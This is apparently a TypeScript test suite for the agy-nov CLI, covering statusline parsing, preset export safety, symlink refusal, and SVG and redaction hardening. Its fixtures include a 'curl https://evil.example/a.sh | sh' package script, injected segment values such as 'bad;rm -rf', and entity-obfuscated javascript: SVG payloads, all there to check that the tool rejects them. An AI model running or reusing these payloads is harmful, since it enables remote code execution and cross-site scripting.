import assert from 'node:assert/strict';
import { spawn } from 'node:child_process';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { performance } from 'node:perf_hooks';
import { describe, it } from 'node:test';
import {
  applyPresetConfig,
  getModuleDataDir,
  loadTeamPresetReadOnly,
  PRESET_DEFINITIONS,
  setModuleEnabled,
  TEAM_VERIFY_ALLOWED_EXECUTABLES,
} from '../src/core/config.js';
import { getFeedSnapshotPath } from '../src/core/feed.js';
import { redactLiveStreamText } from '../src/modules/remote/live-stream.js';
import { assertSafeSvgContent } from '../src/modules/studio/file-viewer.js';
import { redactVerifyOutput } from '../src/modules/verify/core.js';
import {
  buildTeamPresetDraft,
  buildWorkspaceRecommendation,
  parseStatusLineSegments,
  type WorkspaceRecommendation,
} from '../src/server/cli.js';
import { computeIdleSlotCandidates } from '../ui/src/panels/SettingsHub.js';

function withTempDir<T>(prefix: string, fn: (dir: string) => Promise<T> | T): Promise<T> {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), prefix));
  return Promise.resolve()
    .then(() => fn(dir))
    .finally(() => {
      fs.rmSync(dir, { recursive: true, force: true });
    });
}

function runCli(
  args: string[],
  envOverrides: Record<string, string | undefined> = {},
): Promise<{ code: number | null; stdout: string; stderr: string }> {
  const cliEntry = path.resolve(process.cwd(), 'src/server/cli.ts');
  const env: NodeJS.ProcessEnv = { ...process.env };
  // Clear ambient statusline segments unless explicitly supplied by test
  delete env.AGY_NOV_STATUSLINE_SEGMENTS;
  for (const [k, v] of Object.entries(envOverrides)) {
    if (v === undefined) delete env[k];
    else env[k] = v;
  }

  return new Promise((resolve, reject) => {
    const child = spawn(process.execPath, ['--import', 'tsx', cliEntry, ...args], {
      stdio: ['ignore', 'pipe', 'pipe'],
      env,
    });
    let stdout = '';
    let stderr = '';
    child.stdout.on('data', (chunk) => {
      stdout += chunk.toString('utf8');
    });
    child.stderr.on('data', (chunk) => {
      stderr += chunk.toString('utf8');
    });
    child.on('error', reject);
    child.on('close', (code) => resolve({ code, stdout, stderr }));
  });
}

describe('T10.3-A — Customizable CLI statusLine (--segments, env fallback, read-only & symlink safety)', () => {
  it('renders all 9 whitelisted segments from read-only local state & feed-snapshot with full --json telemetry', async () => {
    await withTempDir('agy-nov-v10-sl-full-', async (tmpDir) => {
      const dataDir = path.join(tmpDir, 'data');
      applyPresetConfig(dataDir, 'power');

      // Guard policy (strict-gate) + audit (2 deny/block + 1 allow + 1 ask)
      const guardDir = getModuleDataDir(dataDir, 'guard');
      fs.mkdirSync(guardDir, { recursive: true });
      fs.writeFileSync(
        path.join(guardDir, 'policy.json'),
        JSON.stringify({ enabled: true, permissionMode: 'strict-gate' }),
        'utf8',
      );
      fs.writeFileSync(
        path.join(guardDir, 'audit.json'),
        JSON.stringify([
          { id: '1', decision: 'deny', toolName: 'write_file', timestamp: '2026-11-27T10:00:00Z' },
          { id: '2', decision: 'blocked', toolName: 'run_command', timestamp: '2026-11-27T10:01:00Z' },
          { id: '3', decision: 'ask', toolName: 'edit_file', timestamp: '2026-11-27T10:02:00Z' },
          { id: '4', decision: 'allow', toolName: 'read_file', timestamp: '2026-11-27T10:03:00Z' },
        ]),
        'utf8',
      );

      // X-Ray live-state.json (120k / 200k = 60%, cacheHitRate = 0.78)
      const xrayDir = getModuleDataDir(dataDir, 'xray');
      fs.mkdirSync(xrayDir, { recursive: true });
      fs.writeFileSync(
        path.join(xrayDir, 'live-state.json'),
        JSON.stringify({
          activeConversationId: 'conv-v10-demo',
          lastToolName: 'edit_file',
          peakContextTokens: 120_000,
          cacheHitRate: 0.78,
        }),
        'utf8',
      );

      // Synthetic feed-snapshot.json supplies burn ($0.42) & spec/verify/radar fallback verification
      fs.writeFileSync(
        getFeedSnapshotPath(dataDir),
        JSON.stringify({
          schemaVersion: 1,
          summary: {
            xray: {
              enabled: true,
              peakContextTokens: 120_000,
              estimatedCostUsd: 0.42,
              cacheHitRate: 0.78,
            },
            spec: {
              enabled: true,
              activeSpecId: 'spec-10',
              title: 'Release v1.0.0',
              status: 'draft',
              writeLockActive: true,
              doneTasks: 2,
              totalTasks: 5,
            },
            verify: {
              enabled: true,
              enforceOnStop: true,
              lastStatus: 'pass',
              dirtyFilesCount: 0,
            },
            radar: {
              enabled: true,
              runningCount: 1,
              awaitingCount: 2,
              stalledCount: 1,
              unreadCount: 3,
            },
          },
        }),
        'utf8',
      );

      const allSegments = 'brand,context,burn,cache,spec,verify,guard,radar,network';
      const res = await runCli([
        'statusline',
        `--segments=${allSegments}`,
        '--json',
        `--data-dir=${dataDir}`,
      ]);
      assert.equal(res.code, 0, res.stderr);
      const snap = JSON.parse(res.stdout);

      assert.deepEqual(snap.segments, [
        'brand',
        'context',
        'burn',
        'cache',
        'spec',
        'verify',
        'guard',
        'radar',
        'network',
      ]);
      assert.deepEqual(snap.guard, {
        enabled: true,
        permissionMode: 'strict-gate',
        blockedCount: 2,
      });
      assert.deepEqual(snap.telemetry, {
        contextPercent: 60,
        burn5hUsd: 0.42,
        cacheHitRate: 0.78,
      });
      assert.equal(snap.verify?.lastStatus, 'pass');
      assert.equal(snap.spec?.writeLockActive, true);
      assert.equal(snap.spec?.doneTasks, 2);
      assert.equal(snap.spec?.totalTasks, 5);
      assert.equal(snap.radar?.running, 1);
      assert.equal(snap.radar?.awaitingApproval, 2);
      assert.equal(snap.radar?.stalled, 1);
      assert.equal(snap.radar?.unread, 3);

      assert.ok(snap.line.includes('agy-NOV power · 9/13 (32t)'), `Unexpected brand in: ${snap.line}`);
      assert.ok(snap.line.includes('Ctx[███░░]60%'), `Unexpected context bar in: ${snap.line}`);
      assert.ok(snap.line.includes('5h:$0.42'), `Unexpected burn in: ${snap.line}`);
      assert.ok(snap.line.includes('Cache:78%'), `Unexpected cache in: ${snap.line}`);
      assert.ok(snap.line.includes('Spec:LOCK(2/5)'), `Unexpected spec in: ${snap.line}`);
      assert.ok(snap.line.includes('Verify:PASS'), `Unexpected verify in: ${snap.line}`);
      assert.ok(snap.line.includes('Guard:STRICT(2blk)'), `Unexpected guard in: ${snap.line}`);
      assert.ok(
        snap.line.includes('Radar:1run/2wait/1stall/3unread'),
        `Unexpected radar in: ${snap.line}`,
      );
      assert.ok(snap.line.includes('offline'), `Unexpected network in: ${snap.line}`);

      // Verify compact mode + remote:ON + env fallback
      setModuleEnabled(dataDir, 'remote', true);
      const envRes = await runCli(['statusline', '--compact', `--data-dir=${dataDir}`], {
        AGY_NOV_STATUSLINE_SEGMENTS: 'brand,guard,network',
      });
      assert.equal(envRes.code, 0, envRes.stderr);
      assert.equal(envRes.stdout.trim(), 'NOV 10/13 (36t) · Guard:STRICT(2blk) · remote:ON');
    });
  });

  it('filters unknown/malicious segment names, deduplicates case-insensitively, and creates ZERO files when dataDir is absent', async () => {
    await withTempDir('agy-nov-v10-sl-absent-', async (tmpDir) => {
      const absentDir = path.join(tmpDir, 'never-created-data-dir');

      assert.deepEqual(
        parseStatusLineSegments('Brand, CONTEXT, unknown, bad;rm -rf, context, $ENV, network'),
        ['brand', 'context', 'network'],
      );
      assert.equal(parseStatusLineSegments(undefined), undefined);
      assert.equal(parseStatusLineSegments('   '), undefined);

      const res = await runCli([
        'statusline',
        '--segments=BRAND,unknown_seg,foo;bar,context,burn,cache,spec,verify,guard,radar,network,BRAND',
        '--json',
        `--data-dir=${absentDir}`,
      ]);
      assert.equal(res.code, 0, res.stderr);
      assert.equal(fs.existsSync(absentDir), false, 'statusline must create zero directories/files');

      const snap = JSON.parse(res.stdout);
      assert.deepEqual(snap.segments, [
        'brand',
        'context',
        'burn',
        'cache',
        'spec',
        'verify',
        'guard',
        'radar',
        'network',
      ]);
      assert.equal(snap.preset, 'core');
      assert.equal(snap.enabledCount, 3);
      assert.equal(snap.modelTools, 12);
      assert.deepEqual(snap.guard, {
        enabled: true,
        permissionMode: 'balanced-dev',
        blockedCount: 0,
      });
      assert.equal(snap.telemetry, undefined);
      assert.ok(snap.line.includes('agy-NOV core · 3/13 (12t)'));
      assert.ok(snap.line.includes('Ctx:idle'));
      assert.ok(snap.line.includes('5h:$0.00'));
      assert.ok(snap.line.includes('Cache:n/a'));
      assert.ok(snap.line.includes('Spec:IDLE'));
      assert.ok(snap.line.includes('Verify:IDLE'));
      assert.ok(snap.line.includes('Guard:BAL(0blk)'));
      assert.ok(snap.line.includes('Radar:idle'));
      assert.ok(snap.line.includes('offline'));
      assert.equal(snap.line.includes('unknown_seg'), false);
      assert.equal(snap.line.includes('foo;bar'), false);

      // Default invocation without --segments keeps exact legacy format & omits segments field
      const legacyRes = await runCli(['statusline', '--json', `--data-dir=${absentDir}`]);
      assert.equal(legacyRes.code, 0, legacyRes.stderr);
      assert.equal(fs.existsSync(absentDir), false);
      const legacySnap = JSON.parse(legacyRes.stdout);
      assert.equal(legacySnap.segments, undefined);
      assert.equal(legacySnap.line, 'agy-NOV core · 3/13 (12t) · offline');
    });
  });

  it('ignores symlinks and > 2 MiB JSON files in readJsonSilent without leaking external data', async () => {
    await withTempDir('agy-nov-v10-sl-symlink-', async (tmpDir) => {
      const dataDir = path.join(tmpDir, 'data');
      const outsideDir = path.join(tmpDir, 'outside');
      fs.mkdirSync(outsideDir, { recursive: true });
      applyPresetConfig(dataDir, 'core');

      const guardDir = getModuleDataDir(dataDir, 'guard');
      const xrayDir = getModuleDataDir(dataDir, 'xray');
      fs.mkdirSync(guardDir, { recursive: true });
      fs.mkdirSync(xrayDir, { recursive: true });

      const externalPolicy = path.join(outsideDir, 'ext-policy.json');
      fs.writeFileSync(externalPolicy, JSON.stringify({ permissionMode: 'readonly-audit' }), 'utf8');
      fs.symlinkSync(externalPolicy, path.join(guardDir, 'policy.json'));

      // Oversized > 2 MiB xray live-state.json must be skipped silently
      const giantPad = 'x'.repeat(2 * 1024 * 1024 + 512);
      fs.writeFileSync(
        path.join(xrayDir, 'live-state.json'),
        JSON.stringify({ peakContextTokens: 180_000, pad: giantPad }),
        'utf8',
      );

      const res = await runCli([
        'statusline',
        '--segments=guard,context',
        '--json',
        `--data-dir=${dataDir}`,
      ]);
      assert.equal(res.code, 0, res.stderr);
      const snap = JSON.parse(res.stdout);
      assert.equal(snap.guard?.permissionMode, 'balanced-dev', 'Symlinked policy.json must be ignored');
      assert.equal(snap.telemetry, undefined, 'Oversized > 2 MiB live-state.json must be ignored');
      assert.equal(snap.line, 'Guard:BAL(0blk) · Ctx:idle');
    });
  });
});

describe('T10.3-B — agy-nov recommend --export-preset preview / confirm / force / symlink defenses', () => {
  it('preview mode (--export-preset without --confirm) writes ZERO files and emits valid JSON draft', async () => {
    await withTempDir('agy-nov-v10-preset-preview-', async (tmpDir) => {
      const ws = path.join(tmpDir, 'repo');
      fs.mkdirSync(path.join(ws, '.git'), { recursive: true });
      fs.writeFileSync(
        path.join(ws, 'package.json'),
        JSON.stringify({
          name: 'sample-app',
          scripts: { typecheck: 'tsc --noEmit', lint: 'eslint .', test: 'node --test' },
        }),
        'utf8',
      );
      fs.writeFileSync(path.join(ws, 'openapi.yaml'), 'openapi: 3.0.3\n', 'utf8');

      // Text preview
      const textPreview = await runCli(['recommend', `--workspace=${ws}`, '--export-preset']);
      assert.equal(textPreview.code, 0, textPreview.stderr);
      assert.match(
        textPreview.stdout,
        /Preview only \(no file written\)\. Re-run with --export-preset --confirm to write \.agy-nov\.json/,
      );
      assert.equal(fs.existsSync(path.join(ws, '.agy-nov.json')), false);

      // JSON preview
      const jsonPreview = await runCli([
        'recommend',
        `--workspace=${ws}`,
        '--export-preset',
        '--json',
      ]);
      assert.equal(jsonPreview.code, 0, jsonPreview.stderr);
      assert.equal(fs.existsSync(path.join(ws, '.agy-nov.json')), false);

      const parsed = JSON.parse(jsonPreview.stdout);
      assert.equal(parsed.exportPreset.written, false);
      assert.equal(parsed.exportPreset.exists, false);
      assert.equal(parsed.exportPreset.path, path.join(ws, '.agy-nov.json'));
      assert.equal(parsed.exportPreset.draft.schemaVersion, 1);
      assert.equal(parsed.exportPreset.draft.preset, 'power');
      assert.deepEqual(parsed.exportPreset.draft.enableModules, ['studio']);
      assert.equal(parsed.exportPreset.draft.enableModules.includes('remote'), false);
      assert.ok(parsed.exportPreset.draft.verifyCommands.length >= 2);
      for (const cmd of parsed.exportPreset.draft.verifyCommands) {
        assert.ok(
          TEAM_VERIFY_ALLOWED_EXECUTABLES.has(cmd.executable),
          `Verify executable "${cmd.executable}" must be in allowlist`,
        );
      }
    });
  });

  it('writes valid .agy-nov.json with --confirm, blocks overwrite without --force, allows overwrite with --force, and never includes remote', async () => {
    await withTempDir('agy-nov-v10-preset-confirm-', async (tmpDir) => {
      const ws = path.join(tmpDir, 'repo');
      fs.mkdirSync(path.join(ws, '.git'), { recursive: true });
      fs.writeFileSync(
        path.join(ws, 'package.json'),
        JSON.stringify({
          name: 'confirmed-app',
          scripts: { typecheck: 'tsc --noEmit', test: 'vitest run' },
        }),
        'utf8',
      );
      fs.writeFileSync(path.join(ws, 'pnpm-lock.yaml'), 'lockfileVersion: 9.0\n', 'utf8');

      // 1. First write with --confirm succeeds
      const firstWrite = await runCli([
        'recommend',
        `--workspace=${ws}`,
        '--export-preset',
        '--confirm',
        '--json',
      ]);
      assert.equal(firstWrite.code, 0, firstWrite.stderr);
      const firstJson = JSON.parse(firstWrite.stdout);
      assert.equal(firstJson.exportPreset.written, true);
      assert.equal(firstJson.exportPreset.audit.valid, true);
      assert.deepEqual(firstJson.exportPreset.audit.errors, []);

      const targetPath = path.join(ws, '.agy-nov.json');
      assert.equal(fs.existsSync(targetPath), true);

      // Re-validate independently with loadTeamPresetReadOnly
      const audit = loadTeamPresetReadOnly(ws);
      assert.equal(audit.found, true);
      assert.equal(audit.valid, true);
      assert.equal(audit.errors.length, 0);
      assert.equal(audit.warnings.length, 0);
      assert.equal(audit.preset, 'power');
      assert.equal(audit.enableModules.includes('remote'), false);
      assert.deepEqual(
        audit.verifyCommands.map((c) => `${c.executable} ${c.args.join(' ')}`),
        ['pnpm run typecheck', 'pnpm test'],
      );

      // Ensure raw file never leaks local paths or remote
      const rawContent = fs.readFileSync(targetPath, 'utf8');
      assert.equal(rawContent.includes(ws), false);
      assert.equal(rawContent.includes('remote'), false);

      // 2. Second write without --force must fail with non-zero exit & preserve file
      const markerSentinel = JSON.stringify({ schemaVersion: 1, preset: 'minimal' }, null, 2);
      fs.writeFileSync(targetPath, markerSentinel, 'utf8');

      const blockedOverwrite = await runCli([
        'recommend',
        `--workspace=${ws}`,
        '--export-preset',
        '--confirm',
      ]);
      assert.notEqual(blockedOverwrite.code, 0, 'Duplicate write without --force must fail');
      assert.match(blockedOverwrite.stderr, /--force/i);
      assert.equal(fs.readFileSync(targetPath, 'utf8'), markerSentinel);

      // 3. With --force overwrite succeeds and passes loadTeamPresetReadOnly
      const forcedOverwrite = await runCli([
        'recommend',
        `--workspace=${ws}`,
        '--export-preset',
        '--confirm',
        '--force',
        '--json',
      ]);
      assert.equal(forcedOverwrite.code, 0, forcedOverwrite.stderr);
      const forcedJson = JSON.parse(forcedOverwrite.stdout);
      assert.equal(forcedJson.exportPreset.written, true);
      assert.equal(forcedJson.exportPreset.exists, true);
      const postForceAudit = loadTeamPresetReadOnly(ws);
      assert.equal(postForceAudit.found, true);
      assert.equal(postForceAudit.valid, true);
      assert.equal(postForceAudit.errors.length, 0);
    });
  });

  it('hard-refuses when target .agy-nov.json is a symlink (even with --confirm --force)', async () => {
    await withTempDir('agy-nov-v10-preset-symlink-', async (tmpDir) => {
      const ws = path.join(tmpDir, 'repo');
      const outside = path.join(tmpDir, 'outside');
      fs.mkdirSync(ws, { recursive: true });
      fs.mkdirSync(outside, { recursive: true });

      const victimFile = path.join(outside, 'victim.txt');
      fs.writeFileSync(victimFile, 'DO_NOT_OVERWRITE', 'utf8');
      fs.symlinkSync(victimFile, path.join(ws, '.agy-nov.json'));

      const res = await runCli([
        'recommend',
        `--workspace=${ws}`,
        '--export-preset',
        '--confirm',
        '--force',
      ]);
      assert.notEqual(res.code, 0, 'Symlink target must be hard-refused even with --force');
      assert.match(res.stderr, /symbolic link/i);
      assert.equal(fs.readFileSync(victimFile, 'utf8'), 'DO_NOT_OVERWRITE');
    });
  });

  it('buildTeamPresetDraft strips remote, downgrades full -> local-all, and detects Python/Go/Rust stacks', async () => {
    await withTempDir('agy-nov-v10-draft-pure-', (tmpDir) => {
      const ws = path.join(tmpDir, 'polyglot');
      fs.mkdirSync(ws, { recursive: true });
      fs.writeFileSync(path.join(ws, 'pyproject.toml'), '[project]\nname = "demo"\n', 'utf8');
      fs.writeFileSync(path.join(ws, 'go.mod'), 'module example.com/demo\n', 'utf8');
      fs.writeFileSync(path.join(ws, 'Cargo.toml'), '[package]\nname = "demo"\n', 'utf8');

      const syntheticRec: WorkspaceRecommendation = {
        ...buildWorkspaceRecommendation(ws),
        recommendedPreset: 'full' as unknown as WorkspaceRecommendation['recommendedPreset'],
        suggestedExtraModules: ['remote', 'studio', 'canvas', 'studio'],
      };

      const draft = buildTeamPresetDraft(syntheticRec, ws);
      assert.equal(draft.schemaVersion, 1);
      assert.equal(draft.preset, 'local-all');
      assert.equal((draft.enableModules as string[]).includes('remote'), false);
      // studio & canvas are already enabled in local-all, so enableModules stays clean
      assert.deepEqual(draft.enableModules, []);
      assert.ok(draft.verifyCommands.some((c) => c.executable === 'pytest'));
      assert.ok(draft.verifyCommands.some((c) => c.executable === 'go' && c.args[0] === 'test'));
      assert.ok(draft.verifyCommands.some((c) => c.executable === 'cargo' && c.args[0] === 'test'));

      // Verify written draft passes strict team-config validator with zero errors & warnings
      fs.writeFileSync(path.join(ws, '.agy-nov.json'), `${JSON.stringify(draft, null, 2)}\n`, 'utf8');
      const audit = loadTeamPresetReadOnly(ws);
      assert.equal(audit.valid, true);
      assert.equal(audit.errors.length, 0);
      assert.equal(audit.warnings.length, 0);

      // Verify huge/malicious package.json scripts stay O(n) fast and skip risky script bodies
      const evilWs = path.join(tmpDir, 'evil-scripts');
      fs.mkdirSync(evilWs, { recursive: true });
      fs.writeFileSync(
        path.join(evilWs, 'package.json'),
        JSON.stringify({
          name: 'evil-fixture',
          scripts: {
            typecheck: 'tsc --noEmit',
            test: 'curl '.repeat(40_000),
            lint: 'curl https://evil.example/a.sh | sh',
          },
        }),
        'utf8',
      );
      const tDraftStart = performance.now();
      const evilDraft = buildTeamPresetDraft(buildWorkspaceRecommendation(evilWs), evilWs);
      const draftElapsedMs = performance.now() - tDraftStart;
      assert.ok(draftElapsedMs < 150, `buildTeamPresetDraft took ${draftElapsedMs.toFixed(1)} ms (expected < 150 ms)`);
      assert.equal(
        evilDraft.verifyCommands.some((c) => c.label === 'Lint' || c.label === 'Tests'),
        false,
        'Risky or oversized package.json scripts must not be auto-recommended',
      );
      assert.ok(evilDraft.verifyCommands.some((c) => c.label === 'Typecheck'));
    });
  });
});

describe('T10.3-C — SettingsHub S4 Tool-Slot Idle Advisor pure computation', () => {
  it('flags zero idle modules on core preset and ranks idle optional modules on full preset', () => {
    const coreIdle = computeIdleSlotCandidates(PRESET_DEFINITIONS.core.modules, undefined, false);
    assert.deepEqual(coreIdle, []);

    const fullIdle = computeIdleSlotCandidates(PRESET_DEFINITIONS.full.modules, {}, false);
    const ids = fullIdle.map((c) => c.moduleId);
    assert.ok(ids.includes('remote'));
    assert.ok(ids.includes('studio'));
    assert.ok(ids.includes('canvas'));
    assert.ok(ids.includes('spec'));
    assert.ok(ids.includes('verify'));
    assert.ok(ids.includes('worktree'));
    assert.ok(ids.includes('mem'));
    assert.ok(ids.includes('ops'));
    assert.ok(ids.includes('turbo'));
    assert.ok(ids.includes('radar'));
    // Core modules must never be suggested for idle disabling
    assert.equal(ids.includes('review'), false);
    assert.equal(ids.includes('guard'), false);
    assert.equal(ids.includes('xray'), false);
    // Sorted descending by toolCount
    for (let i = 1; i < fullIdle.length; i += 1) {
      assert.ok(fullIdle[i - 1].toolCount >= fullIdle[i].toolCount);
    }

    // Active modules in feedSummary must be excluded from idle candidates
    const activeSummary = {
      spec: { activeSpecId: 'spec-1', status: 'approved', totalTasks: 3 },
      verify: { lastStatus: 'pass', totalRuns: 2 },
      mem: { totalMemories: 4 },
      turbo: { totalSavedTokens: 1200 },
      radar: { runningCount: 1 },
      remote: { running: true },
    };
    const filteredIdle = computeIdleSlotCandidates(
      PRESET_DEFINITIONS.full.modules,
      activeSummary,
      true,
    );
    const filteredIds = filteredIdle.map((c) => c.moduleId);
    assert.equal(filteredIds.includes('spec'), false);
    assert.equal(filteredIds.includes('verify'), false);
    assert.equal(filteredIds.includes('mem'), false);
    assert.equal(filteredIds.includes('turbo'), false);
    assert.equal(filteredIds.includes('radar'), false);
    assert.equal(filteredIds.includes('remote'), false);
    assert.ok(filteredIds.includes('studio'));
    assert.ok(filteredIds.includes('canvas'));
  });
});

describe('T10.3-D — v0.9.0 Red-Team Defense-in-Depth Hardening (SVG named entities & O(n) private stripper)', () => {
  it('blocks HTML5 named entity protocol obfuscation (&colon;, &Tab;, &NewLine;) in SVG content', () => {
    const maliciousSvgs = [
      '<svg xmlns="http://www.w3.org/2000/svg"><a href="javascript&colon;alert(1)"><rect width="10" height="10"/></a></svg>',
      '<svg xmlns="http://www.w3.org/2000/svg"><a href="java&Tab;script:alert(1)"><rect width="10" height="10"/></a></svg>',
      '<svg xmlns="http://www.w3.org/2000/svg"><a href="java&NewLine;script&Colon;alert(1)"><rect width="10" height="10"/></a></svg>',
      '<svg xmlns="http://www.w3.org/2000/svg"><a href="vbscript&COLON;msgbox(1)"><rect width="10" height="10"/></a></svg>',
      '<svg xmlns="http://www.w3.org/2000/svg"><a href="data&colon;text&sol;html,hi"><rect width="10" height="10"/></a></svg>',
      '<svg xmlns="http://www.w3.org/2000/svg"><a href="java&#00000009;script:alert(1)"><rect width="10" height="10"/></a></svg>',
    ];

    for (const payload of maliciousSvgs) {
      assert.throws(
        () => assertSafeSvgContent(payload),
        /unsafe SVG|forbidden/i,
        `Expected unsafe SVG to be rejected: ${payload}`,
      );
    }

    // Benign SVG with normal text & query-style &table=1 must pass cleanly
    assert.doesNotThrow(() =>
      assertSafeSvgContent(
        '<svg xmlns="http://www.w3.org/2000/svg" width="120" height="60"><a href="https://example.com/?a=1&amp;table=2"><text x="8" y="32">Safe Chart</text></a></svg>',
      ),
    );
  });

  it('processes 20,000 repeated "<private " tokens (~180 KB, no ">") in strict O(n) linear time (< 25 ms) for verify & remote', () => {
    const adversarial = '<private '.repeat(20_000);
    assert.equal(adversarial.length, 180_000);

    const tVerifyStart = performance.now();
    const verifyOut = redactVerifyOutput(adversarial);
    const verifyMs = performance.now() - tVerifyStart;
    assert.equal(verifyOut, adversarial);
    assert.ok(verifyMs < 25, `redactVerifyOutput took ${verifyMs.toFixed(2)} ms (expected < 25 ms)`);

    const tRemoteStart = performance.now();
    const remoteOut = redactLiveStreamText(adversarial);
    const remoteMs = performance.now() - tRemoteStart;
    assert.equal(remoteOut, adversarial);
    assert.ok(
      remoteMs < 25,
      `redactLiveStreamText took ${remoteMs.toFixed(2)} ms (expected < 25 ms)`,
    );

    // Mixed adversarial prefix + real private block still redacts the real block accurately
    const mixed = `${'<private '.repeat(1_000)}<private>TOP_SECRET_DATA</private> tail`;
    const mixedVerify = redactVerifyOutput(mixed);
    const mixedRemote = redactLiveStreamText(mixed);
    assert.equal(mixedVerify.includes('TOP_SECRET_DATA'), false);
    assert.ok(mixedVerify.includes('[REDACTED_PRIVATE] tail'));
    assert.equal(mixedRemote.includes('TOP_SECRET_DATA'), false);
    assert.ok(mixedRemote.includes('[REDACTED_PRIVATE] tail'));

    // Unclosed real <private> tag still redacts remaining text safely
    assert.equal(redactVerifyOutput('ok <private>LEAK_ME'), 'ok [REDACTED_PRIVATE]');
    assert.equal(redactLiveStreamText('ok <private>LEAK_ME'), 'ok [REDACTED_PRIVATE]');
  });
});
